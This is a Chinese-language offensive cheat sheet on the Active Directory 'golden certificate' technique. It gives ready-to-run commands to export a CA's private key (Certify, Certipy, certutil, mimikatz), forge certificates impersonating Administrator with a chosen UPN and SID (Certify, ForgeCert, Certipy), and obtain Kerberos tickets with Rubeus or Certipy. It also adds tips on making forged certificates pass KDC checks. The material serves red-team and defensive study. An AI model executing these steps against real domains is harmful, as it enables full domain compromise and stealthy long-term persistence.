# Active Directory - 黄金证书

黄金证书是攻击者使用 CA 的私钥恶意伪造的证书。

## 获取 CA 证书

导出包含私钥的 CA 证书：

* [GhostPack/Certify](https://github.com/GhostPack/Certify)

    ```ps1
    Certify.exe manage-self --dump-certs
    ```

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

    ```ps1
    certipy ca -u 'administrator@corp.local' -p 'Passw0rd!' -ns '10.10.10.10' -target 'CA.CORP.LOCAL' -config 'CA.CORP.LOCAL\CORP-CA' -backup
    ```

* [windows-gui/certsrv.msc](https://learn.microsoft.com/en-us/system-center/scom/obtain-certificate-windows-server-and-operations-manager)
    * 打开 `certsrv.msc`
    * 右键 CA -> `所有任务` -> `备份 CA...`
    * 按向导操作，确保勾选 `私钥和 CA 证书`

* [windows-gui/certlm.msc](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/export-certificate-private-key)
    * 打开 `certlm.msc`
    * 转到 `个人` -> `证书`
    * 右键 CA 签名证书 -> `所有任务` -> `导出`
    * 按向导操作，确保选择 `是，导出私钥`

* [windows-commands/certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

    ```ps1
    certutil -backupKey -f -p SuperSecurePassw0rd! C:\Windows\Tasks\CaBackupFolder
    ```

* [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

    ```ps1
    mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
    ```

## 伪造黄金证书

伪造目标主体的证书：

* [GhostPack/Certify](https://github.com/GhostPack/Certify)

    ```ps1
    Certify.exe forge --ca-cert <pfx-path/base64-pfx> --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500
    ```

* [GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert)

    ```ps1
    ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath "administrator.pfx" --NewCertPassword "Password"
    ```

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

    ```ps1
    certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'

    certipy forge -template 'attacker.pfx' -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
    ```

:warning: 生成黄金证书时的有用参数。

* `-crl`：如果伪造时省略 `-crl` 选项，身份验证可能会失败。虽然 KDC 出于性能考虑在初始 TGT 颁发期间通常不会执行主动 CRL 查找，但它通常确实会检查证书中是否存在 CDP 扩展。缺少该扩展可能导致 `KDC_ERROR_CLIENT_NOT_TRUSTED` 错误。
* `-template 'attacker.pfx'`：Certipy 会将 attacker.pfx 中的扩展（如密钥用途、基本约束、AIA 等）复制到新伪造的证书中，同时仍按指定设置 **subject**、**UPN** 和 **SID**。
* `-subject "CN=xyz-CA-1, DC=xyz, DC=htb"`：设置证书的**可分辨名称**

## 请求 TGT

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

    ```ps1
    Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-path/base64-pfx>
    ```

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

    ```ps1
    certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.10.10'
    ```

## 参考资料

* [BloodHound - GoldenCert Edge - SpecterOps - April 20, 2025](https://bloodhound.specterops.io/resources/edges/golden-cert)
* [Certificate authority - The Hacker Recipes - July 16,2025](https://www.thehacker.recipes/ad/persistence/adcs/certificate-authority)
* [Domain Persistence Techniques - Valdemar Carøe - August 6, 2025](https://github.com/GhostPack/Certify/wiki/3-‐-Domain-Persistence-Techniques)
* [Post‐Exploitation - Oliver Lyak - May 15, 2025](https://github.com/ly4k/Certipy/wiki/07-‐-Post‐Exploitation)
* [Steal or Forge Authentication Certificates - MITRE ATT&CK - April 15, 2025](https://attack.mitre.org/techniques/T1649/)
